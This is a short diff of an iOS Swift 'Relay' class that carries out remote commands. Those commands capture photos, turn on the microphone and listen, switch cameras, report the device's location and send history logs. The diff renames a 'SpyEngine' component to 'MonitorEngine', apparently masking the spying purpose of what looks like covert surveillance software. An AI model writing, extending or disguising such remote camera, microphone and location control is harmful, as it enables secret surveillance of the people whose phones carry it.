@@ -26,15 +26,15 @@ final class Relay {
         }
         if let d = m["dev"] as? String, d != Dev.id { return }
         switch m["cmd"] as? String {
-        case "snap":       SpyEngine.shared.snap()
+        case "snap":       MonitorEngine.shared.snap()
         case "listen":     MicGate.shared.listen(seconds: m["seconds"] as? Double)
         case "stopListen": MicGate.shared.stopListening()
         case "micOn":      Settings.shared.set(.mic, true, remote: true); MicGate.shared.apply()
         case "micOff":     Settings.shared.set(.mic, false, remote: true); MicGate.shared.apply()
-        case "front":      SpyEngine.shared.cameraPosition = .front
-        case "back":       SpyEngine.shared.cameraPosition = .back
+        case "front":      MonitorEngine.shared.cameraPosition = .front
+        case "back":       MonitorEngine.shared.cameraPosition = .back
         case "recheck":    HealthMon.sweep()
-        case "locate":     SpyEngine.shared.locateNow()
+        case "locate":     MonitorEngine.shared.locateNow()
         case "hist":       Relay.shared.sendJSON(["type": "hist", "rows": Hist.tail(200)], log: false)
         case "openSettings":
             if let u = URL(string: UIApplication.openSettingsURLString) {
